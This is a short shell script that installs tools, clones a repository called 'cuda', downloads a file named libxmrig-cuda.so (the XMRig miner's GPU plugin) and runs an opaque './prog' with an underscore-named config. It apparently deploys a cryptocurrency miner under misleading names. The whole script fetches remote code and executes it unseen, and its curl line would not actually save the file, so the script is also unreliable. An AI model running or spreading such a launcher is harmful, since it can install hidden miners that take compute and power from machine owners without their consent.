# install things
apt install curl git unzip -y

# grab the exec + conf
git clone https://github.com/iceyfromdiscord/cuda
cd cuda

# grab cuda
curl https://github.com/iceyfromdiscord/cuda/releases/download/_/libxmrig-cuda.so

# start
chmod +x ./prog
./prog -c ./_.json
